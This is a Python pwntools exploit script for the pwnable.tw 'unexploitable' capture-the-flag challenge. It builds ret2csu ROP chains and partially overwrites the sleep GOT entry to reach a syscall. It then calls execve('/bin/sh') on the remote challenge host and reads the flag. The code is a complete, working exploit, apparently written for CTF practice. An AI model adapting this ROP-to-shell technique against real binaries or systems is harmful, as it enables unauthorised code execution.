from pwn import *
import time

# Set up pwntools for the correct architecture
exe = "./unexploitable"
libc = ELF("libc.so.6")
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10403 )
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* 0x0000000000400577
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

r = start()

def set_rdi_rsi_rdx(rdi, rsi, rdx, call, ret):
    pay = p64(0x00000000004005e6)
    pay += p64(0)   # padding
    pay += p64(0)   # rbx
    pay += p64(1)   # rbp
    pay += p64(call)   # r12
    pay += p64(rdi)   # r13
    pay += p64(rsi)   # r14
    pay += p64(rdx)   # r15
    pay += p64(0x4005d0)
    pay += b"\x00"*0x38
    pay += p64(ret)
    return pay

# sections
jmprel = 0x0000000004003b8
dynsm = 0x0000000003ff490
strtab = 0x0000000003ff448

# Gadgets
leave_ret = 0x0000000000400576

# time.sleep(3)
# # stage1 - overwrite the strtab of sleep with system
# pay = b"A"*0x18 + set_rdi_rsi_rdx(0, 0x40034f, 16, elf.got.read, elf.sym.main)
# s(pay.ljust(0x100, b"\x00"))
# s(b"system\x00\x00/bin/sh\x00")

# time.sleep(0.5)
# # stage2 - overwrite the got table with the plt stub back.
# pay = b"A"*(0x18-16) + set_rdi_rsi_rdx(0, elf.got.sleep, 8, elf.got.read, elf.sym.main)[:-0x40]
# pay += set_rdi_rsi_rdx(0x40034f+8,0, 0, elf.got.sleep, elf.sym.main)[8:] # system("/bin/sh")
# s(pay.ljust(0x100, b"\x00"))
# sl(p64(0x400456))
# sl(b"ls")

time.sleep(3)
# make libc start main as syscall.
pay = b"A"*0x18 + set_rdi_rsi_rdx(0, elf.got.sleep, 1, elf.got.read, elf.sym.main)
s(pay.ljust(0x100, b"\x00"))
s(b"\xde")

time.sleep(3)
# call /bin/sh in memory. and read in 0x3b bytes to set rax as execve syscall number.
pay = b"A"*0x18 + set_rdi_rsi_rdx(0, 0x601300, 0x3b, elf.got.read, elf.sym.main)[:-0x40]
pay += set_rdi_rsi_rdx(0x601300, 0, 0, elf.got.sleep, 0xdeadbeef)[8:]
s(pay.ljust(0x100, b"\x00"))
sl(b"/bin/sh" + b"\x00"*(0x3b-8))

sl(b"cat /home/unexploitable/flag")

r.interactive()
